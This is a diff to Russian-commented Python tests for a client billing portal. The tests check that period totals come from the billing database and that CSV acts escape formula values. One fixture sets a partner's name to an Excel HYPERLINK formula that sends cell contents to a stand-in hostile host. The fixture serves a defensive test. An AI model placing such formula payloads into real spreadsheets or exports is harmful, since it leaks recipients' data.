@@ -46,9 +46,22 @@ class FakeBilling:
              "unit_price": "30.00", "markup": "15.00", "amount": "45.00",
              "net_amount": "30.00", "partner_amount": "15.00", "partner_name": "Зардал"},
         ]})
+        # Итог считает БАЗА биллинга, а не портал: на полутора тысячах
+        # операций страница кончалась на тысяче, и сумма по ней расходилась
+        # и со счётом, и с админкой.
+        self.summary: tuple[int, Any] = (200, {
+            "period": "2026-09",
+            "totals": {"amount": "90.00", "partner_amount": "30.00",
+                       "net_amount": "60.00", "operations": 2},
+            "invoice": None,
+        })
+        self.asked: list[tuple[str, dict[str, Any]]] = []
 
     def get(self, path: str, authorization: str | None,
             params: dict[str, Any] | None = None) -> tuple[int, Any]:
+        self.asked.append((path, dict(params or {})))
+        if path.endswith("/accruals/summary"):
+            return self.summary
         return self.answer
 
 
@@ -112,10 +125,61 @@ def test_the_client_sees_both_halves_of_the_price(parts: dict[str, Any]) -> None
     """45 ₽ без разбивки читается как «MM-Express берёт 45»."""
     body = parts["client"].get("/api/portal/v1/accruals", params={"period": "2026-09"}).json()
 
-    assert body["totals"] == {"amount": 90.0, "partner_amount": 30.0, "net_amount": 60.0,
-                              "operations": 2}
+    # Итог приезжает от биллинга, посчитанный базой, и НЕ складывается здесь.
+    assert body["totals"] == {"amount": "90.00", "partner_amount": "30.00",
+                              "net_amount": "60.00", "operations": 2}
     assert "наценку партнёра" in body["explanation"]
     assert body["accruals"][0]["partner_name"] == "Зардал"
+
+
+def test_the_total_is_asked_for_and_not_added_up_here(parts: dict[str, Any]) -> None:
+    """Портал не складывает начисления сам.
+
+    На полутора тысячах операций страница заканчивалась на тысяче — молча, — и
+    сумма по ней расходилась и со счётом, и с админкой. Спор «сколько я
+    должен» решался тем, кто аккуратнее сложил.
+    """
+    billing = parts["billing"]
+    # Страница короче, чем итог: ровно та сцена, ради которой итог считает база.
+    billing.summary = (200, {"period": "2026-09",
+                             "totals": {"amount": "67500.00", "partner_amount": "22500.00",
+                                        "net_amount": "45000.00", "operations": 1500},
+                             "invoice": {"number": "INV-2026-09-1", "state": "issued",
+                                         "total_amount": "67500.00"}})
+
+    body = parts["client"].get("/api/portal/v1/accruals", params={"period": "2026-09"}).json()
+
+    assert body["totals"]["operations"] == 1500, (
+        f"итог посчитан по странице ({body['totals']}), а не по периоду")
+    assert body["totals"]["amount"] == "67500.00"
+    assert body["invoice"]["number"] == "INV-2026-09-1", (
+        "счёт за период не показан: клиенту не с чем сверить итог")
+    assert any(path.endswith("/accruals/summary") for path, _ in billing.asked), (
+        "портал не спросил итог у биллинга")
+
+
+def test_a_partner_named_like_a_formula_does_not_execute_in_excel(
+        parts: dict[str, Any]) -> None:
+    """Акт клиента не должен быть исполняемым файлом.
+
+    Значение, начинающееся с `=`, Excel считает формулой и выполняет при
+    открытии. Имя партнёра приходит из онбординга — достаточно назвать его
+    `=HYPERLINK(...)`, и акт клиента становится программой.
+    """
+    parts["billing"].answer = (200, {"accruals": [
+        {"occurred_on": "2026-09-10", "service": "packing", "quantity": "1.000",
+         "unit_price": "30.00", "markup": "15.00", "amount": "45.00",
+         "net_amount": "30.00", "partner_amount": "15.00",
+         "partner_name": '=HYPERLINK("http://зло/?s="&A1,"скидка")'},
+    ]})
+
+    response = parts["client"].get("/api/portal/v1/accruals.csv",
+                                   params={"period": "2026-09"})
+    text = response.content.decode("utf-8")
+
+    assert ";=HYPERLINK" not in text, (
+        "имя партнёра уехало в акт как формула: файл клиента исполняемый")
+    assert "'=HYPERLINK" in text, "значение потерялось вовсе"
 
 
 def test_the_act_is_downloaded_by_the_client_and_written_down(parts: dict[str, Any]) -> None:
